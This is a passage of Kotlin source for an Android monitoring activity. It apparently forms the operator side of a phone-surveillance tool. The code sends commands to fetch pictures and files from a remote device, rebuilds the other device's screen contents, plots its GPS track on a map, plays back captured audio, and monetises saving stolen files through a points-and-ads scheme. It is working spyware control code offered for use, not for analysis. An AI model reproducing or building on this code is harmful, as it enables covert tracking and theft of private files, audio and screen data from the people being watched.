                Toast.makeText(this@MonitorActivity, "Error listening to camera stream", Toast.LENGTH_SHORT).show()
            }
        })
    }

    private fun refreshHistoryFromLocalDatabase(shouldRedirect: Boolean = false) {
        val allLogs = dbHelper.getAllLogs()

        // Clear map overlays before adding new ones from history
        mapView.overlays.clear()
        val geoPoints = mutableListOf<GeoPoint>()

        // Rebuild UI history
        llResults.removeAllViews()
        llResults.addView(tvResults) // Keep the original text view at top if needed
        llResults.addView(btnSaveAudio)

        // Add Clear Logs Button Programmatically to the top of logs if not empty
        if (allLogs.isNotEmpty()) {
            val btnClearLocalLogs = Button(this@MonitorActivity).apply {
                text = "Clear Local Logs"
                setOnClickListener {
                    dbHelper.clearLogs()
                    refreshHistoryFromLocalDatabase()
                    Toast.makeText(this@MonitorActivity, "Local logs cleared", Toast.LENGTH_SHORT).show()
                }
            }
            llResults.addView(btnClearLocalLogs)
        }

        for ((index, log) in allLogs.withIndex()) {
            val isNewAndLatest = shouldRedirect && index == allLogs.size - 1
            appendResultToHistory(log.type, log.data, geoPoints, isNewAndLatest)
        }

        // Check local DB size and warn user
        if (shouldRedirect) {
            val sizeMb = dbHelper.getDatabaseSizeMB()
            if (sizeMb > 100.0) {
                Toast.makeText(this@MonitorActivity, "Local data is %.2f MB. Please clear local logs soon.".format(sizeMb), Toast.LENGTH_LONG).show()
                tvResults.text = "Logs and Results (WARNING: Local Data exceeds 100MB. Please clear logs.)"
                tvResults.setTextColor(Color.RED)
            } else {
                 tvResults.text = "Logs and Results will appear here..."
                 tvResults.setTextColor(Color.BLACK)
            }
        }

        // Update map if locations exist
        if (geoPoints.isNotEmpty()) {
            mapView.visibility = View.VISIBLE
            val polyline = Polyline()
            polyline.setPoints(geoPoints)
            polyline.color = Color.BLUE
            mapView.overlays.add(polyline)

            val currentPoint = geoPoints.last()
            val marker = Marker(mapView)
            marker.position = currentPoint
            marker.setAnchor(Marker.ANCHOR_CENTER, Marker.ANCHOR_BOTTOM)
            marker.title = "Current Location"
            mapView.overlays.add(marker)

            mapView.controller.setZoom(15.0)
            mapView.controller.setCenter(currentPoint)
        }
    }

    private fun appendResultToHistory(type: String, data: String, geoPoints: MutableList<GeoPoint>, shouldRedirect: Boolean = false) {
        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(0, 16, 0, 16)
        }

        val tv = TextView(this).apply {
            textSize = 14f
            setTextIsSelectable(true)
        }

        when (type) {
            "FILE_LIST" -> {
                try {
                    val map = com.google.gson.Gson().fromJson(data, Map::class.java) as Map<String, Any>
                    val path = map["currentPath"] as String
                    val files = map["files"] as List<Map<String, Any>>

                    currentDirectoryPath = path
                    tvCurrentPath.text = currentDirectoryPath

                    val adapter = FileAdapter(this@MonitorActivity, files) { filePath ->
                        // Check if it's a picture based on extension for FETCH_PIC command
                        if (filePath.endsWith(".jpg", true) || filePath.endsWith(".jpeg", true) ||
                            filePath.endsWith(".png", true) || filePath.endsWith(".webp", true)) {
                            sendCommand("FETCH_PIC:$filePath")
                            Toast.makeText(this@MonitorActivity, "Requesting picture...", Toast.LENGTH_SHORT).show()
                        } else {
                            sendCommand("FETCH_FILE:$filePath")
                            Toast.makeText(this@MonitorActivity, "Requesting file...", Toast.LENGTH_SHORT).show()
                        }
                    }
                    lvFiles.adapter = adapter
                    pbFilesLoading.visibility = View.GONE

                    tv.text = "Listed files in $path"
                    container.addView(tv)
                } catch (e: Exception) {
                    pbFilesLoading.visibility = View.GONE
                    tv.text = "Failed to parse file list: ${e.message}"
                    container.addView(tv)
                }
            }
            "TEXT" -> {
                if (data.startsWith("Screen Context:")) {
                    tv.text = "Screen Read Received and Rendered in Screen Tab."
                    tv.setTypeface(null, android.graphics.Typeface.BOLD)
                    container.addView(tv)
                    lastScreenReadText = data
                    buildScreenReadUI(data) // Parse and pass to ScreenReconstructionView

                    // Switch to Screen tab if not already there
                    if (shouldRedirect) tabLayout.getTabAt(2)?.select()
                } else if (data.contains("Coords:")) {
                    tv.text = data
                    container.addView(tv)
                    parseLocationData(data, geoPoints)
                    if (shouldRedirect) tabLayout.getTabAt(3)?.select() // Jump to Map
                } else {
                    tv.text = "Text Result:\n$data"
                    container.addView(tv)
                    if (shouldRedirect) tabLayout.getTabAt(4)?.select() // Jump to Logs
                }
            }
            "IMAGE" -> {
                tv.text = "Image received."
                container.addView(tv)
                lastImageUrl = data // Using this for base64 now

                val btnSaveImage = Button(this).apply {
                    text = "Save Image (50 pts)"
                    setOnClickListener {
                        checkAndDeductPoints(50, "Save Image") {
                            saveLatestImageToDownloads()
                        }
                    }
                }
                container.addView(btnSaveImage)

                try {
                    val imageBytes = Base64.decode(data, Base64.NO_WRAP)
                    val bitmap = BitmapFactory.decodeByteArray(imageBytes, 0, imageBytes.size)
                    if (bitmap != null) {
                        val newImageView = ImageView(this@MonitorActivity).apply {
                            setImageBitmap(bitmap)
                            adjustViewBounds = true
                            layoutParams = LinearLayout.LayoutParams(
                                LinearLayout.LayoutParams.MATCH_PARENT,
                                LinearLayout.LayoutParams.WRAP_CONTENT
                            ).apply {
                                setMargins(0, 16, 0, 16)
                            }
                        }
                        container.addView(newImageView)
                        val targetImageView = newImageView

                        targetImageView.setOnClickListener {
                            val dialog = Dialog(this@MonitorActivity)
                            dialog.requestWindowFeature(Window.FEATURE_NO_TITLE)
                            val fullScreenImageView = ImageView(this@MonitorActivity).apply {
                                setImageBitmap(bitmap)
                                adjustViewBounds = true
                                scaleType = ImageView.ScaleType.FIT_CENTER
                                setOnClickListener { dialog.dismiss() }
                            }
                            dialog.setContentView(fullScreenImageView)
                            dialog.window?.apply {
                                setBackgroundDrawable(ColorDrawable(Color.BLACK))
                                setLayout(WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.MATCH_PARENT)
                            }
                            dialog.show()
                        }
                    } else {
                        tv.text = "Failed to decode image."
                    }
                } catch (e: Exception) {
                    tv.text = "Error processing image: ${e.message}"
                }

                if (shouldRedirect) tabLayout.getTabAt(4)?.select()
            }
            "AUDIO" -> {
                tv.text = "Audio received."
                container.addView(tv)
                lastAudioBase64 = data
                btnSaveAudio.visibility = View.VISIBLE

                val btnPlay = Button(this).apply {
                    text = "Play Audio"
                    setOnClickListener { playAudioFromBase64(data) }
                }
                container.addView(btnPlay)
                if (shouldRedirect) tabLayout.getTabAt(4)?.select() // Jump to Logs
            }
            "FILE" -> {
                val parts = data.split("|")
                if (parts.size >= 2) {
                    val fileName = parts[0]
                    val base64Data = parts[1]
                    tv.text = "File received: $fileName"
                    container.addView(tv)

                    val btnSaveFile = Button(this).apply {
                        text = "Save $fileName (Cost: 50)"
                        setOnClickListener {
                            checkAndDeductPoints(50, "Save File") {
                                saveFileToDownloads(fileName, base64Data)
                            }
                        }
                    }
                    container.addView(btnSaveFile)
                } else {
                    tv.text = "Invalid file data received."
                    container.addView(tv)
                }
                if (shouldRedirect) tabLayout.getTabAt(4)?.select()
            }
            "ERROR" -> {
                tv.text = "Error: $data"
                tv.setTextColor(Color.RED)
                container.addView(tv)
                if (shouldRedirect) tabLayout.getTabAt(4)?.select() // Jump to Logs
            }
        }

        llResults.addView(container, 0) // Add to top
    }

    private fun buildScreenReadUI(data: String) {
        val lines = data.lines().drop(1) // Drop "Screen Context:" line
        val elements = mutableListOf<ScreenElement>()

        // Example format: [Button] Submit (bounds: 100,200,300,400) id: submit_btn
        val regex = Pattern.compile("\\[(.*?)\\](.*?)\\(bounds: (-?\\d+),(-?\\d+),(-?\\d+),(-?\\d+)\\)(.*)")

        for (line in lines) {
            if (line.isBlank()) continue
            val matcher = regex.matcher(line)
            if (matcher.find()) {
                val type = matcher.group(1)?.trim() ?: "Text"
                val label = matcher.group(2)?.trim() ?: ""
                val left = matcher.group(3)?.toIntOrNull() ?: 0
                val top = matcher.group(4)?.toIntOrNull() ?: 0
                val right = matcher.group(5)?.toIntOrNull() ?: 0
                val bottom = matcher.group(6)?.toIntOrNull() ?: 0

                // Avoid degenerate bounds
                if (right > left && bottom > top) {
                    val rect = Rect(left, top, right, bottom)
                    elements.add(ScreenElement(type, label, rect))
                }
            }
        }

        screenReconstructionView.setElements(elements)
    }

    private fun parseLocationData(data: String, geoPoints: MutableList<GeoPoint>) {
        val coordsLine = data.lines().find { it.startsWith("Coords:") }
        if (coordsLine != null) {
            val parts = coordsLine.removePrefix("Coords:").trim().split(",")
            if (parts.size == 2) {
                try {
                    val lat = parts[0].trim().toDouble()
                    val lon = parts[1].trim().toDouble()
                    geoPoints.add(GeoPoint(lat, lon))
                } catch (e: Exception) {
                    // Ignore parse errors
                }
            }
        }
    }

    private fun playAudioFromBase64(base64Audio: String) {
        try {
            val audioBytes = Base64.decode(base64Audio, Base64.NO_WRAP)
            val tempFile = File.createTempFile("received_audio", ".3gp", cacheDir)
            val fos = FileOutputStream(tempFile)
            fos.write(audioBytes)
            fos.close()

            val mediaPlayer = MediaPlayer()
            mediaPlayer.setDataSource(tempFile.absolutePath)
            mediaPlayer.prepare()
            mediaPlayer.start()

            mediaPlayer.setOnCompletionListener {
                it.release()
                tempFile.delete()
            }
        } catch (e: Exception) {
            tvResults.text = "Error playing audio: ${e.message}"
        }
    }

    private fun saveLatestAudioToDownloads() {
        val audioBase64 = lastAudioBase64
        if (audioBase64 == null) {
            Toast.makeText(this, "No audio to save.", Toast.LENGTH_SHORT).show()
            return
        }

        try {
            val audioBytes = Base64.decode(audioBase64, Base64.NO_WRAP)
            val fileName = "x24_audio_${System.currentTimeMillis()}.3gp"

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val resolver = applicationContext.contentResolver
                val contentValues = ContentValues().apply {
                    put(MediaStore.MediaColumns.DISPLAY_NAME, fileName)
                    put(MediaStore.MediaColumns.MIME_TYPE, "audio/3gpp")
                    put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS)
                }

                val uri = resolver.insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, contentValues)
                if (uri != null) {
                    resolver.openOutputStream(uri)?.use { outputStream ->
                        outputStream.write(audioBytes)
                    }
                    Toast.makeText(this, "Saved to Downloads: $fileName", Toast.LENGTH_LONG).show()
                } else {
                    Toast.makeText(this, "Failed to create MediaStore entry", Toast.LENGTH_SHORT).show()
                }
            } else {
                // Fallback for older versions
                val downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
                val file = File(downloadsDir, fileName)
                FileOutputStream(file).use { fos ->
                    fos.write(audioBytes)
                }
                Toast.makeText(this, "Saved to Downloads: $fileName", Toast.LENGTH_LONG).show()
            }
        } catch (e: Exception) {
            Toast.makeText(this, "Error saving audio: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }

    private fun saveLatestImageToDownloads() {
        val base64Image = lastImageUrl
        if (base64Image == null) {
            Toast.makeText(this, "No image to save.", Toast.LENGTH_SHORT).show()
            return
        }
        val fileName = "x24_image_${System.currentTimeMillis()}.jpg"
        saveFileToDownloads(fileName, base64Image)
    }

    private fun saveFileToDownloads(fileName: String, base64Data: String) {
        try {
            val fileBytes = Base64.decode(base64Data, Base64.NO_WRAP)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val resolver = applicationContext.contentResolver
                val contentValues = ContentValues().apply {
                    put(MediaStore.MediaColumns.DISPLAY_NAME, fileName)
                    put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS)
                }

                val uri = resolver.insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, contentValues)
                if (uri != null) {
                    resolver.openOutputStream(uri)?.use { outputStream ->
                        outputStream.write(fileBytes)
                    }
                    Toast.makeText(this, "Saved to Downloads: $fileName", Toast.LENGTH_LONG).show()
                } else {
                    Toast.makeText(this, "Failed to create MediaStore entry", Toast.LENGTH_SHORT).show()
                }
            } else {
                val downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
                val file = File(downloadsDir, fileName)
                FileOutputStream(file).use { fos ->
                    fos.write(fileBytes)
                }
                Toast.makeText(this, "Saved to Downloads: $fileName", Toast.LENGTH_LONG).show()
            }
        } catch (e: Exception) {
            Toast.makeText(this, "Error saving file: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }

    private fun saveLatestScreenTextToDownloads() {
        if (lastScreenReadText == null) {
            Toast.makeText(this, "No screen data to save.", Toast.LENGTH_SHORT).show()
            return
        }

        try {
            val bitmap = android.graphics.Bitmap.createBitmap(screenReconstructionView.width, screenReconstructionView.height, android.graphics.Bitmap.Config.ARGB_8888)
            val canvas = android.graphics.Canvas(bitmap)
            screenReconstructionView.draw(canvas)

            val fileName = "x24_screen_${System.currentTimeMillis()}.jpg"

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val resolver = applicationContext.contentResolver
                val contentValues = ContentValues().apply {
                    put(MediaStore.MediaColumns.DISPLAY_NAME, fileName)
                    put(MediaStore.MediaColumns.MIME_TYPE, "image/jpeg")
                    put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS)
                }

                val uri = resolver.insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, contentValues)
                if (uri != null) {
                    resolver.openOutputStream(uri)?.use { outputStream ->
                        bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 90, outputStream)
                    }
                    Toast.makeText(this, "Saved to Downloads: $fileName", Toast.LENGTH_LONG).show()
                } else {
                    Toast.makeText(this, "Failed to create MediaStore entry", Toast.LENGTH_SHORT).show()
                }
            } else {
                val downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
                val file = File(downloadsDir, fileName)
                FileOutputStream(file).use { fos ->
                    bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 90, fos)
                }
                Toast.makeText(this, "Saved to Downloads: $fileName", Toast.LENGTH_LONG).show()
            }
        } catch (e: Exception) {
            Toast.makeText(this, "Error saving screen image: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }

    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        if (adWebViewContainer.visibility == View.VISIBLE) {
            val elapsedTime = System.currentTimeMillis() - adStartTime
            adWebViewContainer.visibility = View.GONE
            adWebView.loadUrl("about:blank") // Clear content

            if (elapsedTime >= 10000) {
                // Ad viewed for at least 10 seconds, award points
                val earnedPoints = (50..100).random()
                pointsManager.addPoints(earnedPoints)
                updatePointsUI()
                Toast.makeText(this, "You earned $earnedPoints points!", Toast.LENGTH_LONG).show()
            } else {
                Toast.makeText(this, "Ad closed too early. You need to watch for at least 10s.", Toast.LENGTH_SHORT).show()
            }
            return
        }
        super.onBackPressed()
    }

}
